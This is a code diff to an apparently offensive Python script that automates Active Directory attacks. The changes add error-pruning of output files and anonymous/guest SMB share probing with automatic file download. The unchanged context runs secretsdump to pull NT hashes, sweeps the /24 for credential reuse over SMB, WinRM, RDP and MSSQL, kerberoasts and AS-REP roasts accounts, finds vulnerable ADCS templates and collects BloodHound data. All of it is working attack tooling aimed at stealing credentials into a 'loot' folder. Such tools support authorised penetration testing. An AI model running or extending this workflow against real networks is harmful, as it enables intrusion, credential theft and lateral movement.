@@ -119,12 +119,15 @@ def _append_runlog(entry: str) -> None:
 
 def run(cmd: list[str] | str, outfile: Path | None = None,
         timeout: int = 600, shell: bool = False,
-        tag: str | None = None) -> tuple[int, str]:
+        tag: str | None = None, prune_on_error: bool = False) -> tuple[int, str]:
     """Run a command, stream output live to console, and tee to outfile.
 
     - Live mirrors stdout+stderr to the terminal (when MIRROR is True) so the
       operator can act on partial findings immediately.
-    - Always writes the captured output to ``outfile`` (if given).
+    - Writes the captured output to ``outfile`` (if given). With
+      ``prune_on_error=True``, a non-zero exit code does NOT write the outfile
+      (avoids littering the loot dir with error-text files) — run.log still
+      records the command + rc either way.
     - Always appends a one-line entry to the master ``RUN_LOG``.
     """
     pretty = cmd if isinstance(cmd, str) else " ".join(cmd)
@@ -178,13 +181,15 @@ def run(cmd: list[str] | str, outfile: Path | None = None,
         raise
 
     out = "".join(chunks)
-    if outfile:
+    wrote = False
+    if outfile and not (prune_on_error and rc != 0):
         outfile.parent.mkdir(parents=True, exist_ok=True)
         outfile.write_text(out)
+        wrote = True
     _append_runlog(
         f"[{datetime.now().isoformat(timespec='seconds')}] rc={rc} "
         f"({time.time()-started:.0f}s) {pretty}"
-        + (f"  → {outfile}" if outfile else "")
+        + (f"  → {outfile}" if wrote else (f"  (rc!=0, not written)" if outfile else ""))
         + "\n"
     )
     return rc, out
@@ -1495,23 +1500,41 @@ def creds_mode(args) -> int:
     if is_admin and have("impacket-secretsdump") and dom:
         run(["impacket-secretsdump", imp_id(at_host=fqdn), "-dc-ip", ip] + imp_auth() +
             ["-outputfile", str(out / "00_secretsdump")],
-            outfile=out / "00_secretsdump.txt", timeout=600, tag="secretsdump")
+            outfile=out / "00_secretsdump.txt", timeout=600, tag="secretsdump", prune_on_error=True)
         if (out / "00_secretsdump.ntds").exists() or (out / "00_secretsdump.sam").exists():
             hit("secretsdump succeeded — NT hashes in 00_secretsdump.* → PtH / crack -m 1000")
-        # Sweep the /24 for admin + reuse
+
+    # ── 0c. anonymous / guest SMB — probe AND download if readable ──────────
+    # Runs regardless of provided cred: null/guest access is independent and
+    # often exposes files your own account can't see.
+    if have("nxc"):
+        for label, anon in (("null", ["-u", "", "-p", ""]), ("guest", ["-u", "guest", "-p", ""])):
+            rc, o = run(["nxc", "smb", host] + anon + ["--shares"],
+                        outfile=out / f"00_anon_{label}_shares.txt", tag=f"anon-{label}",
+                        prune_on_error=True)
+            if rc == 0 and re.search(r"\bREAD\b", o):
+                hit(f"ANONYMOUS ({label}) SMB READ access — downloading via spider_plus")
+                # spider_plus downloads readable files; lands under ~/.nxc/modules/nxc_spider_plus/
+                run(["nxc", "smb", host] + anon + ["-M", "spider_plus", "-o", "DOWNLOAD_FLAG=True"],
+                    outfile=out / f"00_anon_{label}_spider.txt", timeout=900,
+                    tag=f"anon-{label}-spider", prune_on_error=True)
+                break  # null worked → no need to retry as guest
+
+    if have("nxc"):
+        # ── 1. /24 sweep for admin + cred reuse ─────────────────────────────
         seg = re.sub(r"\.\d+$", ".0/24", ip)
-        run(["nxc", "smb", seg] + nxc_auth, outfile=out / "01_smb_sweep.txt", timeout=900, tag="smb-sweep")
+        run(["nxc", "smb", seg] + nxc_auth, outfile=out / "01_smb_sweep.txt", timeout=900, tag="smb-sweep", prune_on_error=True)
         for proto in ("winrm", "rdp", "mssql"):
-            run(["nxc", proto, seg] + nxc_auth, outfile=out / f"01_{proto}_sweep.txt", timeout=900, tag=f"{proto}-sweep")
+            run(["nxc", proto, seg] + nxc_auth, outfile=out / f"01_{proto}_sweep.txt", timeout=900, tag=f"{proto}-sweep", prune_on_error=True)
 
-        # ── 1. authenticated SMB: shares + write perms + spider ─────────────
-        run(["nxc", "smb", host] + nxc_auth + ["--shares"], outfile=out / "02_shares.txt", tag="shares")
-        run(["nxc", "smb", host] + nxc_auth + ["--users"], outfile=out / "02_users.txt", tag="users")
-        run(["nxc", "smb", host] + nxc_auth + ["--pass-pol"], outfile=out / "02_pass_pol.txt", tag="passpol")
-        run(["nxc", "smb", host] + nxc_auth + ["-M", "spider_plus"],
-            outfile=out / "02_spider.txt", timeout=900, tag="spider")
+        # ── 2. authenticated SMB: shares + write perms + spider ─────────────
+        run(["nxc", "smb", host] + nxc_auth + ["--shares"], outfile=out / "02_shares.txt", tag="shares", prune_on_error=True)
+        run(["nxc", "smb", host] + nxc_auth + ["--users"], outfile=out / "02_users.txt", tag="users", prune_on_error=True)
+        run(["nxc", "smb", host] + nxc_auth + ["--pass-pol"], outfile=out / "02_pass_pol.txt", tag="passpol", prune_on_error=True)
+        run(["nxc", "smb", host] + nxc_auth + ["-M", "spider_plus", "-o", "DOWNLOAD_FLAG=True"],
+            outfile=out / "02_spider.txt", timeout=900, tag="spider", prune_on_error=True)
 
-        # ── 2. authenticated LDAP (LDAPS/636 auto-fallback): roast + delegation + laps/gmsa ─
+        # ── 3. authenticated LDAP (LDAPS/636 auto-fallback): roast + delegation + laps/gmsa ─
         ldap_call(["--kerberoasting", str(out / "03_kerberoast.hash")],
                   out / "03_kerberoast.txt", "kerberoast")
         ldap_call(["--asreproast", str(out / "03_asrep.hash")],
@@ -1524,25 +1547,25 @@ def creds_mode(args) -> int:
         ldap_call(["--query", "(&(objectClass=user)(description=*))", "sAMAccountName description"],
                   out / "03_descriptions.txt", "descriptions")
 
-    # ── 3. Kerberoast + delegation via impacket (independent of nxc path) ────
+    # ── 4. Kerberoast + delegation via impacket (independent of nxc path) ────
     if have("impacket-GetUserSPNs") and dom:
         run(["impacket-GetUserSPNs", imp_id(), "-dc-ip", ip] + imp_auth() +
             ["-request", "-outputfile", str(out / "04_getuserspns.hash")],
-            outfile=out / "04_getuserspns.txt", tag="getuserspns")
+            outfile=out / "04_getuserspns.txt", tag="getuserspns", prune_on_error=True)
     if have("impacket-findDelegation") and dom:
         run(["impacket-findDelegation", imp_id(), "-dc-ip", ip] + imp_auth(),
-            outfile=out / "04_finddelegation.txt", tag="finddelegation")
+            outfile=out / "04_finddelegation.txt", tag="finddelegation", prune_on_error=True)
 
-    # ── 4. ADCS discovery ──────────────────────────────────────────────────
+    # ── 5. ADCS discovery ──────────────────────────────────────────────────
     if have("certipy-ad") and dom:
         cer = ["certipy-ad", "find", "-dc-ip", ip, "-ns", ip, "-vulnerable", "-stdout"]
         if args.kerberos: cer += ["-k", "-no-pass", "-target", fqdn]
         elif args.hash:   cer += ["-u", f"{args.user}@{dom}", "-hashes", args.hash]
         else:             cer += ["-u", f"{args.user}@{dom}", "-p", args.password]
-        rc, o = run(cer, outfile=out / "05_adcs.txt", timeout=300, tag="certipy")
+        rc, o = run(cer, outfile=out / "05_adcs.txt", timeout=300, tag="certipy", prune_on_error=True)
         if re.search(r"ESC\d", o): hit("ADCS vulnerable template (ESC*) — see 05_adcs.txt → §6.2")
 
-    # ── 5. BloodHound collection ────────────────────────────────────────────
+    # ── 6. BloodHound collection ────────────────────────────────────────────
     if have("bloodhound-python") and dom:
         bh = ["bloodhound-python", "-d", dom, "-dc", fqdn, "-ns", ip, "-c", "All", "--zip"]
         if args.kerberos: bh += ["-u", args.user, "-k", "-no-pass", "--use-kcache"]
